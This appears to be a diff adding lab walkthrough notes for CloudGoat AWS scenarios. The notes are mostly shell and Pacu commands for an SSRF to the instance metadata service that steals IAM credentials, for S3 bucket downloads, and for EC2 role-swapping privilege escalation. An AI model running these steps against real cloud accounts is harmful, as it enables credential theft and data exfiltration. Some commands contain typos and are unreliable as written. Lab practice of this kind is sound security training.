@@ -633,6 +633,91 @@ aws --profile chris s3 ls
 
 #### Cloud Breach S3
 
+<pre class="language-bash"><code class="lang-bash"># CloudGoat will provide IP address when starting up
+nslookup &#x3C;IP>  # name should specify a type of instance i.e. ec2
+nmap -T4 -n -Pn -p- &#x3C;IP>
+# Navigate to web page on port 80 but nothing shows
+nmap -A -T5 -Pn -p80 &#x3C;IP>
+# Check /robots.txt (Mentions modifying Host using metadata service)
+# Intercept the same page in Burp Suite
+# Send to Repeater and modify the Host value to: 169.254.169.254 and resend the request
+# Then modify the GET request value from /robots.txt to: /latest/metadata/iam/security-credentials
+# This will return a 200 now and give a user account
+# Modify the GET request now to: /latest/metadata/iam/security-credentials/&#x3C;USER ACCOUNT>
+# Resending this request will get us the AccessKeyId, SecretAccessKey, and token
+# Now to create a profile with the found account information
+aws configure --profile waf  # Put in fuond AccessKeyId, SecretAccessKey, and token
+pacu
+0  # For New Session
+cloud_breach_s3  # For session name
+import_keys waf
+ls  # Using Category Enum
+run iam_enum_permissions
+run ec2__enum
+<strong>run s3__download_bucket
+</strong># Exit pacu
+aws --profile waf s3 ls
+aws --profile waf s3 sync s3://&#x3C;BUCKET NAME> .
+</code></pre>
+
 #### IAM PrivEsc by Attachment
 
+```bash
+aws --profile kerrigan s3 ls  # Access denied
+aws --profile kerrigan ec2 describe-volumnes  # Not authorized
+aws --profile kerrigan iam list-roles  # We have some roles!
+aws --profile kerrigan iam list-instance-profiles  # How you can attach permissions to an ec2 instance
+aws --profile kerrigan ec2 create-key-pair --key-name privesc-key1 --query 'KeyMaterial' --output text > privesc-key1.pem  # Create SSH keys
+chmod 600 privesc-key1.pem
+aws --profile kerrigan ec2 describe-instances | grep InstanceId
+aws --profile kerrigan ec2 describe-instances --instance-ids <InstanceId> | grep 'ami\|subnet\|GroupName\|GroupId\|us-'
+# Lets create an instance
+aws --profile kerrigan ec2 run-instances --image-id <ImageId> --instance-type t2.micro --iam-instance-profile Arn=<Arn> --key-name privesc-key1--subnet-id <SubnetId> --security-group-ids <GroupId> --region us-east-1
+# Detach role
+aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name <InstanceProfileName> --role-name <RoleName>
+# Attach mighty role
+aws --profile kerrigan iam attach-role-to-instance-profile --instance-profile-name <InstanceProfileName> --role-name <RoleName>
+ssh -i privesc-key1.pem ubuntu@<IP>
+curl http://169.254.169.254/latest
+```
+
 #### EC2 SSRF
+
+```bash
+aws configure
+pacu
+0  # New Session
+ec2_ssrf  # Session Name
+import_keys <PROFILE NAME>
+ls
+run iam__enum_permissions
+set_regions us-east-1
+run ec2__enum
+run lambda__enum  # Found Access Keys
+# Create new profile with found Access Keys
+aws configure --profile lamb
+# Back in pacu:
+import_keys lamb
+run iam__enum_permissions
+run ec2__enum
+aws --profile lamb ec2 describe-instances --instance-id <InstanceId>
+# Open PublicIp in a browser for the web server  # TypeError: URL must be a string, not undefined
+# Modify the IP address in the URL bar to: <IP>/?url=http://localhost
+# Modify the IP address again to: <IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
+# Found a role, so appended that to the URL: <IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
+# Found AccessKeyId, SecretAccessKey, and token
+# Created new profile adding the found AccessKeyId, SecretAccessKey, and token
+aws configure --profile ssrf
+pacu
+import_keys ssrf
+run iam__enum_permissions
+run ec2__enum
+run s2__download_bucket
+aws --profile ssrf s3 ls
+aws --profile ssrf s3 ls s3://<BUCKET NAME>
+aws --profile ssrf s3 cp s2://<BUCKET NAME>/<FILE> .
+# Found more keys. Create new profile with keys then rinse and repeat.
+aws configure --profile s3user
+aws --profile s3user lambda list-functions
+aws --profile s3user lambda invoke --function-name <FunctionName> ./outfile.txt
+```
